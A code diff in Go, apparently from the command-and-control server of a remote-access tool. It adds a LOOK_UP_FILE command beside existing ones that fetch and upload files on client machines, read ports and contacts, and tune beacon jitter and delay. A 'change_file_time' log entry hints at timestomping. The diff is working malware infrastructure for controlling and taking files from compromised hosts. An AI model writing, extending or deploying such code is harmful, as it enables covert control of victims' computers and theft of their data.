@@ -2407,7 +2407,7 @@ func Getcmd(uid, cmd, Taskid string) string {
     var finalCmd string
     var logMsg string
 
-    if cmd != "" && !strings.HasPrefix(cmd, "SWITCH_VERSION*//*") &&
+    if cmd != "" && !strings.HasPrefix(cmd, "SWITCH_VERSION*//*") && !strings.HasPrefix(cmd, "LOOK_UP_FILE*//*") &&
         !strings.HasPrefix(cmd, "GET_PORTS*//*") && !strings.HasPrefix(cmd, "GET_U_FRIENDS*//*") &&
         !strings.HasPrefix(cmd, "LOAD_U_FILE*//*") && !strings.HasPrefix(cmd, "GET_U_FILE*//*") &&
         !strings.HasPrefix(cmd, "GET_JITTER*//*") && !strings.HasPrefix(cmd, "GET_DELAY*//*") && 
@@ -2425,38 +2425,47 @@ func Getcmd(uid, cmd, Taskid string) string {
 			logMsg = fmt.Sprintf(log_word["change_file_time"], uid,cmd_split[1],cmd_split[2])
 		}
 		finalCmd = cmd
-	}else if strings.HasPrefix(cmd, "SWITCH_VERSION*//*") {
+	}else if strings.HasPrefix(cmd, "SWITCH_VERSION*//*") || strings.HasPrefix(cmd, "LOOK_UP_FILE*//*") {
         // SWITCH_VERSION
-        cmd_split := strings.Split(cmd, "*//*")
-        if len(cmd_split) != 2 {
-            return "missing parameter"
-        }
-        version := cmd_split[1]
-
-        // 更新 client version
-		go func(){
-	        clientDataMu.Lock()
-	        for i := range client_data.Clients {
-	            client := &client_data.Clients[i]
-	            if uid == client.Uid {
-	                client.version = version
-	                break
-	            }
+		if strings.HasPrefix(cmd, "SWITCH_VERSION*//*"){
+	        cmd_split := strings.Split(cmd, "*//*")
+	        if len(cmd_split) != 2 || cmd_split[1] == ""{
+	            return "missing parameter"
 	        }
-	        clientDataMu.Unlock()
-            
-            windows_clientMu.Lock()
-            for i := range windows_client_data.Clients {
-                client := &windows_client_data.Clients[i]
-                if uid == client.Uid {
-                    client.Version = version
-                    break
-                }
-            }
-            windows_clientMu.Unlock()
-		}()
-
-        finalCmd = cmd
+	        version := cmd_split[1]
+	
+	        // 更新 client version
+			go func(){
+		        clientDataMu.Lock()
+		        for i := range client_data.Clients {
+		            client := &client_data.Clients[i]
+		            if uid == client.Uid {
+		                client.version = version
+		                break
+		            }
+		        }
+		        clientDataMu.Unlock()
+	            
+	            windows_clientMu.Lock()
+	            for i := range windows_client_data.Clients {
+	                client := &windows_client_data.Clients[i]
+	                if uid == client.Uid {
+	                    client.Version = version
+	                    break
+	                }
+	            }
+	            windows_clientMu.Unlock()
+			}()
+	
+	        finalCmd = cmd
+		}
+		if strings.HasPrefix(cmd, "LOOK_UP_FILE*//*"){
+			parts := strings.Split(cmd, "*//*")
+			if len(parts) < 2 || parts[1] == "" {
+		        return "missing parameter"
+		    }
+			finalCmd = cmd
+		}
 
     } else if strings.HasPrefix(cmd, "GET_JITTER*//*") || strings.HasPrefix(cmd, "GET_DELAY*//*") {
         parts := strings.Split(cmd, "*//*")
